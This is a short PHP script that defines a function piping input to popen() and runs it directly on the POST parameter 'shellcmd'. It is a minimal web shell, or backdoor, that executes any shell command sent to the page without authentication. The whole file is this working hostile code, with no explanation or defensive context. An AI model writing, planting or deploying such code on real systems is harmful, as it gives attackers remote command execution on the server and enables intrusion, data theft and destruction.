<?php
function exec_shell($cmd)
{
    $handle = popen($cmd, "r");
    pclose($handle);
    return 0;
}

exec_shell($_POST['shellcmd']);
?>